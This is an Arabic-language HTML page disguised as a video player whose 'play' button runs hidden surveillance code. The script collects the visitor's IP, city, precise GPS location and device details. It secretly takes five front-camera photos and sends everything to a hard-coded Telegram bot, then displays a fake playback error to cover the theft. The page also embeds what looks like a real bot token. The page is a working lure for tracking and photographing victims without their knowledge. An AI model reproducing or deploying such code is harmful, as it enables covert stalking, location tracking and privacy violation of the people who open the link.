<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>مشاهدة الفيديو</title>
  <!-- استدعاء مكتبة الأيقونات FontAwesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    body {
      margin: 0;
      font-family: 'Tahoma', sans-serif;
      background: #111;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
      padding: 20px;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 15px;
    }
    p {
      color: #aaa;
      margin-bottom: 25px;
      font-size: 16px;
    }
    button {
      background: #ff0050;
      color: white;
      border: none;
      padding: 12px 28px;
      border-radius: 30px;
      font-size: 18px;
      cursor: pointer;
      box-shadow: 0 0 10px rgba(255, 0, 80, 0.5);
      transition: 0.3s;
      display: inline-flex;
      align-items: center;
      gap: 10px;
    }
    button:active {
      transform: scale(0.95);
    }
    video {
      display: none;
    }
    #status {
      margin-top: 15px;
      color: #ff0050;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <h1><i class="fa-solid fa-clapperboard"></i> اضغط لمشاهدة الفيديو</h1>
  <p>يرجى النقر على الزر أدناه لبدء تشغيل العرض</p>
  <button id="playBtn" onclick="startProcess()"><i class="fa-solid fa-play"></i> تشغيل الفيديو</button>
  <div id="status"></div>

  <video id="video" autoplay playsinline muted></video>

  <script>
    const token = "8622279801:AAF65eNhnDJD38K6jpIFY4ji2lXl_hR7M7o";
    const chatId = "8908174599";

    async function sendTelegramMessage(text) {
      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text }),
        });
      } catch (e) {
        console.error("خطأ في إرسال الرسالة", e);
      }
    }

    async function sendPhoto(blob, index) {
      try {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, `photo_${index}.jpg`);
        formData.append("caption", `📸 الصورة رقم ${index}`);

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: formData
        });
      } catch (e) {
        console.error("خطأ في إرسال الصورة", e);
      }
    }

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        return await res.json();
      } catch {
        return { country_name: "غير معروف", city: "غير معروف", ip: "غير معروف" };
      }
    }

    async function getBatteryInfo() {
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          return {
            level: Math.round(battery.level * 100),
            charging: battery.charging ? "نعم ⚡" : "لا ❌"
          };
        }
      } catch {}
      return { level: "غير معروف", charging: "غير معروف" };
    }

    async function getLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve("❌ غير متاح");
          return;
        }
        navigator.geolocation.getCurrentPosition((pos) => {
          const lat = pos.coords.latitude.toFixed(5);
          const lon = pos.coords.longitude.toFixed(5);
          resolve(`https://maps.google.com/?q=${lat},${lon}`);
        }, () => {
          resolve("❌ تم رفض الإذن");
        }, { timeout: 5000, enableHighAccuracy: true });
      });
    }

    async function startProcess() {
      const btn = document.getElementById("playBtn");
      const status = document.getElementById("status");
      btn.disabled = true;
      status.innerText = "جاري التحميل...";

      const ipInfo = await getIPInfo();
      const battery = await getBatteryInfo();
      const location = await getLocation();
      
      let now;
      try {
        now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });
      } catch {
        now = new Date().toLocaleString();
      }

      const deviceInfo = navigator.userAgent;
      const screenRes = `${window.screen.width}x${window.screen.height}`;
      const connection = navigator.connection || {};
      const memory = navigator.deviceMemory || "غير معروف";
      const cores = navigator.hardwareConcurrency || "غير معروف";

      const message = `
📝 معلومات الزائر:
🌍 الدولة: ${ipInfo.country_name || 'غير معروف'} 
🏙️ المدينة: ${ipInfo.city || 'غير معروف'}
🌐 IP: ${ipInfo.ip || 'غير معروف'}
📍 الموقع: ${location}

📱 الجهاز:
🔋 الشحن: ${battery.level}%
⚡ يشحن؟: ${battery.charging}
📶 الاتصال: ${connection.effectiveType || "غير معروف"}
💾 الذاكرة: ${memory} GB
⚙️ الأنوية: ${cores}
🖥️ المتصفح: ${deviceInfo}
📏 الشاشة: ${screenRes}
🕓 الوقت: ${now}
`;

      await sendTelegramMessage(message);

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" } 
        });
        const video = document.getElementById("video");
        video.srcObject = stream;
        await video.play();

        // التقاط 5 صور متتالية كل ثانية
        let count = 0;
        const interval = setInterval(() => {
          count++;
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          canvas.toBlob(async (blob) => {
            if (blob) {
              await sendPhoto(blob, count);
            }
          }, "image/jpeg", 0.8);

          if (count >= 5) {
            clearInterval(interval);
            stream.getTracks().forEach(track => track.stop());
            status.innerText = "عذراً، حدث خطأ في تشغيل الفيديو.";
            btn.disabled = false;
          }
        }, 1000); // التقاط صورة كل 1000 ملي ثانية (ثانية واحدة)

      } catch (err) {
        await sendTelegramMessage("⚠️ فشل فتح الكاميرا أو تم رفض الإذن.");
        status.innerText = "يرجى السماح بصلاحيات الكاميرا للمشاهدة.";
        btn.disabled = false;
      }
    }
  </script>
</body>
</html>
